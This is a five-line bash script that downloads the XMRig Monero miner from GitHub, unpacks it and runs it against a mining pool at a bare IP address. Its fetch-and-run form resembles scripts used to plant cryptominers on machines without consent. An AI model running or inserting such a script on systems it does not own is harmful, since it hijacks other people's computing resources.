#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.3.1/xmrig-6.3.1-xenial-x64.tar.gz
tar xfvz xmrig-6.3.1-xenial-x64.tar.gz
cd xmrig-6.3.1
./xmrig --donate-level 1 -o 3.235.140.177:3333 --tls
